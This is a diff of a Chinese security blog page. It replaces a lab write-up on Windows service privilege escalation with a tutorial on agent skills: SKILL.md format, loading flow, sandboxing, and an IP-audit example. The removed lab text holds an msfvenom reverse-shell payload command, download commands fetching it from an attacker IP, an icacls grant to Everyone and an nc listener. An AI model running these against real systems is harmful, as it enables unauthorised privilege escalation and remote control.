@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>权限提升-windows服务提权 - 安全员小周 | ROOT</title>
+    <title>agent skills - 安全员小周 | ROOT</title>
     <!-- Prism CSS for Synthax Highlighting (White Theme) -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" rel="stylesheet" />
     <link rel="stylesheet" href="/assets/css/style.css">
@@ -146,7 +146,7 @@
                 ☰
             </button>
             <div class="breadcrumb">
-                ~/home/内网/权限提升/权限提升-windows服务提权 ...
+                ~/home/AI/agent skills ...
             </div>
 
             <div class="search-container">
@@ -156,86 +156,453 @@
         </header>
 
         <main class="content-area">
-            <h1 class="article-title">权限提升-windows服务提权</h1>
+            <h1 class="article-title">agent skills</h1>
             <div class="markdown-body">
-                <h1>0X01 windows服务</h1>
+                <h1>一、Skills</h1>
+<h2>1.1 第一层: 结构</h2>
+<h3>完整结构:</h3>
+<pre><code class="language-Shell">my-skill/
+├── SKILL.md          # Required: instructions + metadata
+├── scripts/          # Optional: executable code
+├── references/       # Optional: documentation
+└── assets/           # Optional: templates, resources
+</code></pre>
+<h3>描述文件: Skill.md</h3>
+<ol>
+<li><h4>前沿结构:</h4>
+</li>
+</ol>
+<pre><code class="language-YAML"># 必选
+---
+name: skill-name
+description: A description of what this skill does and when to use it.
+---
+
+
+# 可选
+---
+name: pdf-processing
+description: Extract text and tables from PDF files, fill forms, merge documents.
+license: Apache-2.0
+metadata:
+  author: example-org
+  version: &quot;1.0&quot;
+---
+</code></pre>
+<ol start="2">
+<li><h4>结构约束:</h4>
+</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th><strong>字段属性</strong></th>
+<th><strong>是否必填</strong></th>
+<th><strong>格式/约束要点</strong></th>
+<th><strong>重点价值 (AI 视角)</strong></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong><code>name</code></strong></td>
+<td><strong>必填</strong></td>
+<td>小写字母、数字、连字符(<code>-</code>)；1-64 字符；​<strong>必须与父目录名一致</strong>​。</td>
+<td>​<strong>唯一索引</strong>​：Agent 定位并加载技能文件的唯一 ID。</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong><code>description</code></strong></td>
+<td><strong>必填</strong></td>
+<td>1-1024 字符；需包含核心功能关键词及具体使用场景。</td>
+<td>​<strong>路由决策</strong>​：Agent 根据这段描述决定是否“激活”该技能。</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong><code>license</code></strong></td>
+<td>可选</td>
+<td>简短名称（如 Apache-2.0）或指向 LICENSE 文件。</td>
+<td>​<strong>合规性</strong>​：明确该 SOP 是否涉及专有知识或开源协议。</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong><code>compatibility</code></strong></td>
+<td>可选</td>
+<td>描述环境依赖（如<code>git</code>,<code>docker</code>,<code>internet</code>）。</td>
+<td>​<strong>前置检查</strong>​：防止 Agent 在缺少必要工具的环境中执行报错。</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong><code>metadata</code></strong></td>
+<td>可选</td>
+<td>自定义 Key-Value 映射（如<code>version</code>,<code>author</code>）。</td>
+<td>​<strong>扩展性</strong>​：存储版本号或负责人，便于小米内部溯源管理。</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong><code>allowed-tools</code></strong></td>
+<td>可选</td>
+<td>空格分隔的预核准工具列表（如<code>Bash(git:*)</code>）。</td>
+<td>​<strong>安全边界</strong>​：严格限制 AI 执行该技能时允许动用的底层工具权限。</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<ol start="3">
+<li><h4>正文 markdown</h4>
+</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th><strong>核心模块</strong></th>
+<th><strong>编写重点</strong></th>
+<th><strong>重点价值 (AI 视角)</strong></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>分步说明 (SOP)</strong></td>
+<td>必须包含清晰的线性逻辑链路，使用动词开头的祈使句。</td>
+<td>​<strong>减少歧义</strong>​：确保 Agent 严格按步骤执行，不跳步、不抢跑。</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>示例 (Few-Shot)</strong></td>
+<td>提供至少 1-2 组典型的“输入/输出”对照对。</td>
+<td>​<strong>抑制幻觉</strong>​：这是最有效的手段，通过模仿案例纠正 AI 的推理偏向。</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>边界情况 (Edge)</strong></td>
+<td>明确告知 AI 在何种异常输入下应停止执行或报错。</td>
+<td>​<strong>安全兜底</strong>​：界定技能边界，触发无法处理的逻辑时强制人工介入。</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>文件拆分策略</strong></td>
+<td>若逻辑过于复杂，建议将文档拆分至<code>references/</code>目录。</td>
+<td>​<strong>Token 优化</strong>​：遵循渐进式披露原则，防止上下文过载导致 AI 性能下降。</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3>脚本目录(可选): scripts/</h3>
+<p>常见的语言包括 Python、Bash 和 JavaScript</p>
+<h3>资源目录(可选): references/</h3>
+<p>资源检索，注意在skill的文本中使用绝对路径指向资源</p>
+<pre><code class="language-XML">See [the reference guide](references/REFERENCE.md) for details.
+
+Run the extraction script:
+scripts/extract.py
+</code></pre>
+<h3>资产目录(可选): assets/</h3>
+<ul>
+<li>模板（文档模板、配置模板）</li>
+<li>图片（图表、示例）</li>
+<li>数据文件（查找表、模式）</li>
+</ul>
+<h2>1.2 第二层: skill 运行原理</h2>
+<h3>渐进式披露:</h3>
 <blockquote>
-<p>Windows 服务由服务控制管理器 (SCM) 管理。 SCM 是一个负责根据需要管理服务状态、检查任何给定服务的当前状态并通常提供配置服务的方法的进程。</p>
-<pre><code> 其次我们可以知道windows 服务是 与 exe 可执行文件相关，同时 我们可以知道服务需要指定一个用户,因此我们能够想到什么 就是上次我们分享到 计划任务 
+<ul>
+<li>发现 ：启动时，代理只会加载每个可用技能的名称和描述，仅足以知道何时可能与skill相关。</li>
+<li>激活 ：当任务与技能描述匹配时，代理会将完整的 <code>SKILL.md</code> 指令读取到上下文中。</li>
+<li>执行 ：代理程序按照指令执行，可根据需要加载引用的文件或执行捆绑代码。</li>
+</ul>
+</blockquote>
+<h3>流程图示:</h3>
+<p><img src="https://ocn3kdrqevp1.feishu.cn/space/api/box/stream/download/asynccode/?code=OTVkOTk5MDNhNzZkZmYzYmFmNTgzMDliYWQ0NTZlNDhfN0pxQjNtdnlBVHlLQ01lVXQ3aFkwWWJaR3B0YU1Wb29fVG9rZW46VnY3VWJrdkFmb1NQc3d4cFF6SWN1NHNzbnJlXzE3NzE1MTIwMzM6MTc3MTUxNTYzM19WNA" alt=""></p>
+<ol>
+<li><h4>启动阶段： 索引目录</h4>
+</li>
+</ol>
+<blockquote>
+<ul>
+<li><strong>开发者动作：</strong> 扫描 /skills 目录。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li><strong>数据流：</strong> 后端程序提取所有 SKILL.md 顶部的 name 和 description，拼成一段 XML/JSON 喂给 LLM。</li>
+</ul>
+</blockquote>
+<ol start="2">
+<li><h4>意图阶段： 目录点菜</h4>
+</li>
+</ol>
+<blockquote>
+<ul>
+<li><strong>模型动作：</strong> 用户说“帮我查个漏洞”，模型分析菜单，输出：</li>
+</ul>
+<p><code>  {&quot;use_skill&quot;: &quot;vulnerability-scanner&quot;}</code>。</p>
+<ul>
+<li><strong>关键点：</strong> 模型此时手里只有菜单，还没有具体的“菜”（详细指令）。</li>
+</ul>
+</blockquote>
+<ol start="3">
+<li><h4>读取阶段：两种读取方式</h4>
+</li>
+</ol>
+<blockquote>
+<ul>
+<li><em><strong><code>路径 A (Filesystem)：</code></strong></em> 开发者直接把 <code>location</code>（文件路径）给模型。<ul>
+<li><em>模型自学：</em> 模型自己发出指令：<code>cat /path/to/scanner/SKILL.md</code>。</li>
+<li><em>宿主动作：</em> 终端直接把文件内容吐出来。</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>​***<code>路径 B (Function Calling)</code><em><strong>​</strong><code>：</code></em>*<code> </code>开发者拦截模型意图。<ul>
+<li><em>宿主动作：</em> 后端程序读取 <code>SKILL.md</code> 的​<strong>全部内容</strong>​，作为一条 <code>system_message</code> 或 <code>tool_output</code> 重新喂给模型。</li>
+<li>​*目的：*​* 这就像把整本“操作指南”翻开递给模型。</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<ol start="4">
+<li><h4>执行阶段：脚本落地 (Execution)</h4>
+</li>
+</ol>
+<blockquote>
+<ul>
+<li><strong>最终动作：</strong> 模型输出具体的 <code>bash</code> 命令或 <code>Tool Call</code>。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li><strong>宿主动作：</strong> 真正去跑那个脚本。</li>
+</ul>
+</blockquote>
+<h3>代码实现:</h3>
+<ol>
+<li><h4>第一步: 解析元数据生成目录</h4>
+</li>
+</ol>
+<blockquote>
+<p>读取skill.md</p>
+<pre><code>- name: frontmatter.name, - description: frontmatter.description
 </code></pre>
 </blockquote>
-<pre><code>&gt; 
-&gt; 如果我们能够也获得相应 exe 文件的修改权限我们是否可以根据这个权限，执行一个payload获取到相应服务指定用户的权限
+<pre><code class="language-Shell">function parseMetadata(skillPath):
+    content = readFile(skillPath + &quot;/SKILL.md&quot;)
+    frontmatter = extractYAMLFrontmatter(content)
 
-# 0x02 靶场实践
-
-## 查找 windows服务
-
-&gt; 首先找一找服务 选一个服务 看到了WindowsScheduler
-
-  
-
-![](https://img2.imgtp.com/2024/03/18/1mRaN220.png)
-
-&gt; 我们可以看到 执行的二进制文件 C:\\PROGRA2\\SYSTEM1\\WService.exe
-&gt; 
-&gt;   
-
-## 权限
-
-  
-
-&gt; 看看权限
-
-![](https://img2.imgtp.com/2024/03/18/9899R1FF.png)
-
-&gt; 其实这个时候我们就可以看到 我们everyone组有读写权限 有权限就好办
-
-## payload
-
-&gt; msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=10.11.69.232 LPORT=4444 -f exe-service -o 1.exe
-&gt; 
-&gt; 生成一个 服务的二进制文件 可以直接连接的
-
-  
-
-## 载荷投递
-
-&gt; kali 建立 http 服务
-&gt; 
-&gt; 在受害机器中wget [http://ip:8000/1.exe](http://ip:8000/1.exe) -O rev-svc.exe
-&gt; 
-&gt; 应该是wget 可以在 powershell中使用不过这是个安装了wget
-&gt; 
-&gt; 正常应该是使用
-&gt; 
-&gt; Invoke-WebRequest -Uri “[https://10.11.69.232/1.exe](https://10.11.69.232/1.exe)“ -OutFile”1.exe”
-
-  
-
-## 修改替换
-
-&gt; 此时我们正常会想到什么? 那肯定是利用我们的权限然后直接覆盖掉服务的 exe文件
-&gt; 
-&gt; 直接 找到 \\PROGRA2\\SYSTEM1
-
-![](https://img2.imgtp.com/2024/03/19/JuZV7N1q.png)
-
-&gt; 又试了 shell  
-&gt; Move-Item -Path “C:\\Users\\thm-unpriv\\1.exe” -Destination “C:\\PROGRA2\\SYSTEM1\\WService.exe” 完美解决 直接将我们的 1.exe 换成了
-&gt; 
-&gt; 此时查看权限我们应该是由 完整的拥有这个文件的所有权限
-&gt; 
-&gt; 但是此时我们不仅是要看我们有这个权限我们还要看 我们要运行的服务的目标账户有没有权限
-&gt; 
-&gt; 要把权限 给足 直接就是 icacls 服务 /grant Everyone:F
-
-## get shell
-
-&gt; 直接nc -lvp 4444
-&gt; 
-&gt; 启动服务连接
+    return {
+        name: frontmatter.name,
+        description: frontmatter.description,
+        path: skillPath
+    }
 </code></pre>
+<ol start="2">
+<li><h4>第二步：目录生成</h4>
+</li>
+</ol>
+<blockquote>
+<p>将第一步中 metadata 进行封装为xml 作为skills菜单.</p>
+</blockquote>
+<pre><code class="language-XML">&lt;available_skills&gt;
+  &lt;skill&gt;
+    &lt;name&gt;pdf-processing&lt;/name&gt;
+    &lt;description&gt;Extracts text and tables from PDF files, fills forms, merges documents.&lt;/description&gt;
+    &lt;location&gt;/path/to/skills/pdf-processing/SKILL.md&lt;/location&gt;
+  &lt;/skill&gt;
+  &lt;skill&gt;
+    &lt;name&gt;data-analysis&lt;/name&gt;
+    &lt;description&gt;Analyzes datasets, generates charts, and creates summary reports.&lt;/description&gt;
+    &lt;location&gt;/path/to/skills/data-analysis/SKILL.md&lt;/location&gt;
+  &lt;/skill&gt;
+&lt;/available_skills&gt;
+</code></pre>
+<p><strong>注意事项: ​</strong></p>
+<blockquote>
+<ul>
+<li>基于文件系统的代理.在 <code>location</code> 字段中包含 SKILL.md 文件的绝对路径。</li>
+<li>基于工具的代理，可以省略 location 字段。</li>
+<li>保持元数据整洁.</li>
+</ul>
+</blockquote>
+<ol start="3">
+<li><h4>可用库</h4>
+</li>
+</ol>
+<p>链接: <a href="https://github.com/agentskills/agentskills/tree/main/skills-ref">https://github.com/agentskills/agentskills/tree/main/skills-ref</a></p>
+<h2>1.3 安全性</h2>
+<blockquote>
+<p>能够运行脚本以及查看资源，都伴随着可能存在的间接注入或者命令执行的安全风险.</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>防御维度</strong></th>
+<th><strong>核心逻辑</strong></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>沙盒 (Sandboxing)</strong></td>
+<td>环境隔离。脚本运行在无网络、只读挂载或资源受限的 Docker/gVisor 容器中。</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>允许列表 (Allowlisting)</strong></td>
+<td>信任源控制。只有经过安全团队代码审计并签名的 SKILL.md 及其配套脚本才允许被加载。</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>用户确认 (Confirmation)</strong></td>
+<td>人工介入 (HITL)。涉及写数据库、删除文件、发送邮件等高危指令时，系统必须挂起并等待人工点“同意”。</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>日志审计 (Logging)</strong></td>
+<td>可追溯性。全量记录：输入提示词、模型输出意图、最终执行的具体 Shell 命令、执行结果。</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1>二、Skills 实践</h1>
+<blockquote>
+<p>采取github copilot进行相关实践操作.</p>
+</blockquote>
+<h2>2.1 第一步: 启动 agent skill</h2>
+<h3>环境:</h3>
+<blockquote>
+<ul>
+<li>最新版本vscode</li>
+<li>Vscode copilot 插件</li>
+</ul>
+</blockquote>
+<h3>设置:</h3>
+<blockquote>
+<ul>
+<li>Chat › Experimental: Use Skill Adherence Prompt</li>
+<li>Chat: Use Agent Skills</li>
+<li>Chat: Use Nested Agents Md File</li>
+</ul>
+</blockquote>
+<p><img src="https://ocn3kdrqevp1.feishu.cn/space/api/box/stream/download/asynccode/?code=MTBhZjg0NzM0NmVhMjEwYmJjZGJlNzM3Mjc5ZjQzODhfQXdYOTBsRW9oaVU2cUNXNlZNTFpseVdud1hzYjluV0lfVG9rZW46QUNrVWIxenNBb2RTa054aVlBU2NRRVBrbjViXzE3NzE1MTE3MzA6MTc3MTUxNTMzMF9WNA" alt=""></p>
+<h2>2.2 第二步: 编写skill</h2>
+<ul>
+<li>项目技能，存储在你的存储库中（<code>.github/skills</code> 或 <code>.claude/skills</code>）</li>
+<li>个人技能，存储在你的主目录中并跨项目共享（<code>~/.copilot/skills</code> 或 <code>~/.claude/skills</code>）（仅适用于 Copilot 编码智能体 和 GitHub Copilot 命令行界面）</li>
+</ul>
+<h3>项目skill: 结构</h3>
+<p><img src="https://ocn3kdrqevp1.feishu.cn/space/api/box/stream/download/asynccode/?code=NjE1ZWIyNTdhODhhZGYyMGVmMTg1MmNmZGFhMmQ0NDFfTXBvVW96QnNsdlFYMHFNdkJlNjdpWk0wRzVmZGxVMUlfVG9rZW46VEZTRmJjUUJOb21hTm54UUFxMmM3QmFZblZiXzE3NzE1MTE3MzA6MTc3MTUxNTMzMF9WNA" alt=""></p>
+<h3>项目skill: SKILL.md</h3>
+<pre><code class="language-YAML">---
+name: IP_check
+description: 用于代码中的 IP 安全审计。当发现代码涉及 IP 地址、URL 或网络配置时触发。
+---
+
+#  ip 地址安全审计技能
+主要用于识别和评估代码中涉及的 IP 地址的安全风险。通过自动化脚本校验 IP 地址的合法性和潜在威胁，并根据风险等级提供审计结论。
+
+# 审计工作流
+
+你现在是安全专家，请按以下步骤执行：
+
+1. **识别**：找出用户提供的代码片段中的所有 IP 地址字符串。如:127.0.0.1 等
+2. **校验​ ​(调用脚本)**：针对发现的每个 IP
+[CRITICAL]：禁止直接输出预测结果。你必须首先在终端执行 python scripts/validate_ip.py，并根据实际获取的终端输出进行下一步。
+3. **定级​ ​(参考文档)**：根据脚本输出的结果，查阅 `references/risk_level.md` 确定风险等级。
+# 报告输出格式
+一旦1-3步骤完成，输出以下格式的审计报告：(强制要求)
+IP: &lt;IP_ADDRESS&gt;
+风险等级: &lt;风险等级&gt;
+审计结论: &lt;结论&gt;
+</code></pre>
+<h3>项目skill: references</h3>
+<blockquote>
+<ul>
+<li>risk_level.md</li>
+</ul>
+</blockquote>
+<pre><code class="language-XML">| 发现类型 | 风险等级 | 处理建议 |
+| :--- | :--- | :--- |
+| 内网 IP 暴露 | 高危 (High) | 必须增加 SSRF 过滤逻辑 |
+| 无效 IP 格式 | 低危 (Low) | 提醒开发者清理冗余代码 |
+| 公网 IP | 信息 (Info) | 无需特殊处理 |
+</code></pre>
+<h3>项目skill: scripts</h3>
+<blockquote>
+<ul>
+<li>validate_ip.py</li>
+</ul>
+</blockquote>
+<pre><code class="language-Python">import sys
+import ipaddress
+
+def check(ip_str):
+    try:
+        ip = ipaddress.ip_address(ip_str)
+        # 判断是否为私有 IP 地址
+        if ip.is_private:
+            return f&quot;RESULT: {ip_str} is a PRIVATE IP (SSRF Risk!)&quot;
+        return f&quot;RESULT: {ip_str} is a PUBLIC IP.&quot;
+    except:
+        return f&quot;RESULT: {ip_str} is INVALID format.&quot;
+
+if __name__ == &quot;__main__&quot;:
+    print(check(sys.argv[1]))
+</code></pre>
+<h2>2.3 第三步: 测试</h2>
+<h3>正常IP逻辑:</h3>
+<p><img src="https://ocn3kdrqevp1.feishu.cn/space/api/box/stream/download/asynccode/?code=MmZhNDgxNTU4YTBkYjJiN2I0ODEwNDIyZTlkMWQ3OWRfODNRYnlWWml3eDFxY1N2Q0JkZnhmbWZpekNlSEVUQ0pfVG9rZW46SmZDSWJ2T0VWb0lnazF4Q1VNVGNJdzFybnNoXzE3NzE1MTE3MzA6MTc3MTUxNTMzMF9WNA" alt=""></p>
+<h3>错误IP逻辑:</h3>
+<p><img src="https://ocn3kdrqevp1.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjMzYTgyYjI0YzRkMWQ5YmMyZDYzMGNhZjIwYzE4NWZfc2YyUlZkZWdSWWo3REQyU2UyUUJUdTBlNkZjdGJrUVNfVG9rZW46S2NZbmJGb3hIb3Z1TE94UVJVRmNIbXlXbnNjXzE3NzE1MTE3MzA6MTc3MTUxNTMzMF9WNA" alt=""></p>
+<h1>三、个人想法:</h1>
+<blockquote>
+<p>前一段时间MCP很火. 2026年后SKILL 横空出世. 很多媒体都开始进行一些时代变革的渲染. 不得不承认，agent的发展确实是一个大趋势. 这对甲方安全来讲也是一个极大的挑战. 但接触下来后我发现这些新概念并没有&quot;如此神秘&quot;. 越深入了解越觉得与前面的mcp/function calling 调用基本差不多.</p>
+<p>同样安全测:间接注入/权限问题/投毒问题也是存在同样的问题.依旧需要从人工介入、沙箱运行、来源判定、触发监控. 总之AI在发展，AI安全也在随之进步，还是要保持一个求知求学的状态.</p>
+</blockquote>
+<h1>四、参考:</h1>
+<ol>
+<li><strong><a href="https://agentskills.io/home">AgentSkills.io</a></strong></li>
+</ol>
+<blockquote>
+<p><em>注：重点参考其关于 SKILL.md 的编写规范，特别是如何利用 ​</em>​*<code>references/</code><em>​</em>​ 目录进行上下文优化。*</p>
+</blockquote>
+<ol start="2">
+<li><strong><a href="https://docs.github.com/zh/copilot/concepts/agents/about-agent-skills">GitHub Copilot Skills Docs</a></strong></li>
+</ol>
+<blockquote>
+<p><em>​注：​</em>​<em>GitHub</em>​<em>​ 官方关于 Agent SKILL扩展机制对于copil 的说明，包含系统集成与交互逻辑。</em></p>
+</blockquote>
 
             </div>
         </main>
